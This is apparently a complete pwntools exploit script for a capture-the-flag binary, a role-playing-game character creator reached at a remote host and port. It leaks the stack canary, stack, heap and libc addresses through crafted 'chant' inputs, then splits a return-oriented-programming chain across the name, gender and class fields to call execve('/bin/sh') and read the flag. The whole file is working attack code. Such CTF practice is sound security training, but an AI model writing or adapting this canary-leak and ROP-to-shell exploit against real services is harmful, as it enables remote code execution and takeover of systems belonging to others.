#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './chall_patched'
HOST = '100.64.0.66'
PORT = 33109

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x149b
brva 0x1a98
continue
c
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):    
    p.sendafter(prompt, data)
def sl(prompt):
    p.sendlineafter(prompt)
def s(data):
    p.send(data)


# leak canary + saved rbp
sla(b'Steam Account: ', b'HELLO')
sla(b'Create a new character? (yes/no): ', b'yes')
sla(b'(max 31 chars): ', b'N' * 8)
sla(b'(Male/Female/Other): ', b'Other')
sla(b'Enter age: ', b'1127')
sla(b' class: ', b'Pyromancer')
sla(b'(Health): ', b'24')
sla(b'(Magic Slots): ', b'24')
sla(b'(Stamina): ', b'24')
sla(b'Strength: ', b'24')
sla(b'Dexterity: ', b'24')
sla(b'Intelligence: ', b'24')
sla(b'Faith: ', b'99')
sla(b'Luck: ', b'24')
sla(b'Input chant length: ', b'24')
sla(b'Input chant length: ', b'8')
sa(b'Chant: ', b'E' * 8 )
sla(b'choice (1-9): ', b'1')

p.recvuntil(b'E'*8 + b'\n')
data = p.recvline(13)
canary = b'\x00' + data[:7]
stack = data[7:13]
canary = u64(canary)
stack = u64(stack.ljust(8, b'\x00'))
log.info(f'Leaked canary: {hex(canary)}')
log.info(f'Leaked stack: {hex(stack)}')
stack_base = stack - 0x2a28b

#leak libc + heap
sla(b'Create a new character? (yes/no): ', b'yes')
sla(b'(max 31 chars): ', b'N' * 8)
sla(b'(Male/Female/Other): ', b'Other')
sla(b'Enter age: ', b'+')
sla(b' class: ', b'Pyromancer')
sla(b'(Health): ', b'24')
sla(b'(Magic Slots): ', b'24')
sla(b'(Stamina): ', b'24')
sla(b'Strength: ', b'24')
sla(b'Dexterity: ', b'24')
sla(b'Intelligence: ', b'24')
sla(b'Faith: ', b'99')
sla(b'Luck: ', b'24')
sla(b'Input chant length: ', b'24')
sla(b'Input chant length: ', b'8')
payload = b'F' * 8 + p64(canary) + p64(stack + 0xb8)
sa(b'Chant: ', payload)
sla(b'choice (1-9): ', b'2')

p.recvuntil(b'\x1B[33mAge:           \x1B[0m')
heap_leak = p.recv(11) #each byte is a ascii
data = ""
for i in heap_leak:
    data += chr(i)
heap_base = int(data)*0x1000
log.info(f'Heap base: {hex(heap_base)}')

p.recvuntil(b'Welcome, Undead ')
libc_leak = u64(p.recv(6) + b'\x00\x00')
log.info(f'Leaked libc: {hex(libc_leak)}')

# saved rbp + 0xaa = username
# ???? + 0xaa = libc leak
libc.address = libc_leak - 0x2a28b
log.info(f'Libc base: {hex(libc.address)}')

#rop
pop_rdi = 0x000000000010f78b + libc.address
pop_rsp = 0x000000000003c068 + libc.address
binsh = next(libc.search(b'/bin/sh\x00'))
ret = 0x000000000002882f + libc.address
execve = libc.sym['execve']
pop_rsi_pop_r15 = 0x000000000010f789 + libc.address
char_base = heap_base + 0x2a0
pop_rsi = 0x0000000000110a7d
pop_rax = 0x00000000000dd237 + libc.address
syscall = 0x00000000000288b5 + libc.address

# send payload
sla(b'Create a new character? (yes/no): ', b'yes')

rop_name = p64(0) + p64(canary) + p64(0) +  p64(ret)[:7]
sa(b' chars): ', rop_name)
rop_gender = p64(pop_rsi_pop_r15)+p64(0)[:7]
sa(b'Enter gender (Male/Female/Other):', rop_gender)
sla(b'age: ', b'0')
rop_class = p64(0)+p64(pop_rdi) + p64(binsh) + p64(execve)[:7]
sa(b'class', rop_class.ljust(31, b'A'))

sla(b'(Health): ', b'24')
sla(b'(Magic Slots): ', b'24')
sla(b'(Stamina): ', b'24')
sla(b'Strength: ', b'24')
sla(b'Dexterity: ', b'24')
sla(b'Intelligence: ', b'24')
sla(b'Faith: ', b'99')
sla(b'Luck: ', b'24')
sla(b'Input chant length: ', b'24')
sla(b'Input chant length: ', b'8')
payload = b'D'*8 + p64(canary) + p64(char_base + 0x18)
sa(b'Chant: ', payload)

sla(b'choice (1-9): ', b'7')
sl(b'cat flag.txt')
p.interactive()
